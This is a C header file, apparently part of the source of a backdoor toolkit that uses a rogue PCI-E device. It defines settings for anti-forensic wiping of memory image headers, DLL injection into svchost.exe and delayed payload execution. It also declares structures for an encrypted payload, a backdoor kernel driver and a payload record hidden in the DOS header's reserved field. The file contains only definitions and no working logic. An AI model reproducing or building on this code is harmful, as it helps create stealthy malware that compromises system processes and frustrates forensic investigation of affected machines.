
// wipe image headers from memory
#define USE_ANTI_FORENSICS

// target process to inject DLL
#define DRIVER_INJECT_PROCESS "svchost.exe"

// sleep before payload execution (in seconds)
#define LOADER_START_SLEEP 1

// vendor ID and device ID of rogue PCI-E device
#define PCI_VENDOR_ID 0x10ee
#define PCI_DEVICE_ID 0x1337

// for BACKDOOR_DRIVER flags
#define DRIVER_FLAG_REALLOCATE 0x00000001

#pragma pack(1)

#define PAYLOAD_KEY_LEN 0x10

typedef struct _PAYLOAD_HEADER
{
    unsigned int UnpackedSize;
    unsigned char Key[PAYLOAD_KEY_LEN];
    unsigned char Data[];

} PAYLOAD_HEADER,
*PPAYLOAD_HEADER;

typedef struct _BACKDOOR_DRIVER
{
    void *ImageBase;
    void *TargetBase;
    void *KernelBase;
    unsigned int Flags;

} BACKDOOR_DRIVER,
*PBACKDOOR_DRIVER;

typedef struct _BACKDOOR_PAYLOAD
{
    unsigned int Offset;
    unsigned int Size;

} BACKDOOR_PAYLOAD,
*PBACKDOOR_PAYLOAD;

#pragma pack()

#define BACKDOOR_PAYLOAD_INFO(_image_) ((PBACKDOOR_PAYLOAD)&(((IMAGE_DOS_HEADER *)(_image_))->e_res))
